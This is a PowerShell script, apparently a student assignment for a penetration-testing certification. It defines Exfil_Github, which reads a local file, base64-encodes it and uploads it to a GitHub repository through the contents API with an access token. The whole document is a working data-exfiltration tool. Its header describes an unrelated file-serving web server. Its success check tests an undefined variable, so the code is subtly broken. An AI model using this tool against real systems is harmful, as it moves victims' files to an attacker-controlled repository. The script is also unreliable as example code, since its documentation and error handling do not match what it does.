function Exfil_Github {




<#
.SYNOPSIS
This powershell script is a simple web server in powershell wihch could be used to list,delete,downlaod and upload files over http.

.DESCRIPTION
This powershell script is a simple web server in powershell wihch could be used to list,delete,downlaod and upload files over http.

.EXAMPLE
 PS C:\> . '.\8th assignment.ps1'
 Exfil_Github -Token  **********  -git_url https://api.github.com/repos/somerepo -File C:\Test.txt

.LINK
Part of the below Code's Credite goes to the following URLs
https://developer.github.com/v3/repos/contents/
https://github.com/samratashok/nishang/blob/master/Utility/Do-Exfiltration.ps1
https://github.com/samratashok/nishang/blob/master/Utility/Add-Exfiltration.ps1
https://github.com/caspeerr0/PSDP/blob/master/Assignment_8/exfiltration.ps1


.Note 
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3259



#>








[CmdletBinding()] Param( 

    [Parameter(Mandatory = $true)]
    [String]
    $Token ,
       [Parameter(Mandatory = $true)]
       [String]
       $git_url,
       [Parameter(Mandatory = $true)]
       [String]
       $File ,
       [Parameter(Mandatory = $false)]
       [String]
       $Mesaage = "my commit message",

       [Parameter(Mandatory = $false)]
       [String]
       $CommitterName = "Monalisa Octocat",

       [Parameter(Mandatory = $false)]
       [String]
       $Email = "octocat@github.com"
    )

        #get file content 
            $FileContent = Get-Content $File
        #convert content to base64
            $ContentRaw = [System.Text.Encoding]::UTF8.GetBytes($FileContent)
            $Converted_to_Base64 = [System.Convert]::ToBase64String($ContentRaw)
        #authentication using token 
            $authentication = @{"Authorization"="token $Token"}
        #Creating message to bes sent and converting it to JSON
            $Committer = @{"name"=$CommitterName; "email"=$Email}
            $Data = @{"message"=$Mesaage; "committer"=$Committer; "content"=$Converted_to_Base64 }
            $Data_ConvertedTo_JSON = ConvertTo-Json $Data
            
        #Creating web request by calling Invoke-WebRequest and using PUT http method with basic parsing for JSON Data
            $Request = Invoke-WebRequest -Headers $authentication -Method PUT -Body $Data_ConvertedTo_JSON -Uri $git_url -UseBasicParsing
            
            try{
            if ($req.StatusCode -eq 201){
                write-host "Data was succesfully sent" 
            }
            }

            catch {write-host "Something went wrong"}

            }